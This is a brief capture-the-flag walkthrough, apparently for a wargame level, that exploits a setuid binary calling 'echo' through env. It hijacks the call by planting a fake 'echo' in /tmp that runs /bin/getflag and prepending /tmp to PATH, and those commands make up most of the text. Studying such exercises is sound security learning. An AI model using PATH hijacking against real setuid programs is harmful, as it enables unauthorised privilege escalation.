# Level 03

ls -la => right of flag03

strings level03

```
/usr/bin/env echo Exploit me
```

we assume they perform an echo cmd so we could replace this cmd

```
echo '/bin/getflag' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
```

